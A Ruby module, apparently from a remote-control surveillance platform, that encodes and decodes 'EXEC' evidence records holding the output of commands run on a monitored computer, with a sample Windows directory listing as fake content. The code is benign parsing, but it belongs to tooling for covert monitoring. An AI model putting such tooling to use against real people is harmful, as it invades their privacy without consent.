require 'rcs-common/evidence/common'

module RCS

  module ExecEvidence

    def content
      output = <<-eos
   Volume in drive C has no label.
   Volume Serial Number is 587F-CB14

   Directory of c:\

  27/02/2011  14:14             1.024 .rnd
  25/10/2011  13:06    <DIR>          inetpub
  03/05/2012  11:14                 0 output.txt
  14/07/2009  05:20    <DIR>          PerfLogs
  28/04/2011  16:11    <DIR>          Program Files
  27/02/2011  14:14    <DIR>          Program Files (x86)
  04/02/2011  15:22    <DIR>          Temp
  23/03/2012  12:42    <DIR>          Users
  25/10/2011  13:05    <DIR>          Windows
                 2 File(s)          1.024 bytes
                 7 Dir(s)  39.704.879.104 bytes free                                                                                                                                                                    
      eos

      output.to_utf16le_binary
    end

    def generate_content
      [ content ]
    end

    def additional_header

      command = ["dir c:", "ls -la"].sample
      command = command.to_utf16le_binary

      header = StringIO.new
      header.write [command.size].pack("I")
      header.write command

      header.string
    end

    def decode_additional_header(data)
      raise EvidenceDeserializeError.new("incomplete EXEC") if data.nil? or data.bytesize == 0

      ret = Hash.new
      ret[:data] = Hash.new

      binary = StringIO.new data
      command_len = binary.read(4).unpack("I").first
      ret[:data][:command] = binary.read(command_len).utf16le_to_utf8

      ret
    end

    def decode_content(common_info, chunks)
      info = Hash[common_info]
      info[:data] = Hash.new if info[:data].nil?
      info[:grid_content] = chunks.join
      info[:data][:content] = info[:grid_content].utf16le_to_utf8
      yield info if block_given?

      :delete_raw
    end
  end

end # ::RCS
